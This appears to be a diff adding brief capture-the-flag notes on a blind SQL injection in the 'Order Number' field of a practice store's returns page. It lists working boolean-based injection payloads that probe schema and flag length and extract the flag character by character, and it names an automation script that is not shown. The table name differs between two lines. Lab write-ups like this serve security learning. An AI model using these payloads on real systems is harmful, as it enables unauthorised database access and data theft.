@@ -1,0 +1,16 @@
+***Analyzing the application***
+Vulnerable parameter:
+	'Order Number' at 'http://nahamstore.thm/returns'
+Vunerability:
+	order no: 12 --> Invalid Order number
+	12000 or (SELECT length(schema_name) from information_schema.schemata limit 1,1)='10';-- -		--->	(working, because it lists the return info of a random order)
+Type:
+	Blind SQL injection
+
+***Identify length(flag)***
+	12000 or (SELECT length(flag) FROM sql_two limit 1)='34';-- -	---> so, length of the flag is: '34'
+
+***Detemine & Extract the flag***
+	12000 or SUBSTRING((SELECT flag FROM sqli_two limit 1),1,1)='{';-- -
+	
+[+] Automate the process using the python script 'flag2_blind_SCRIPT.py'
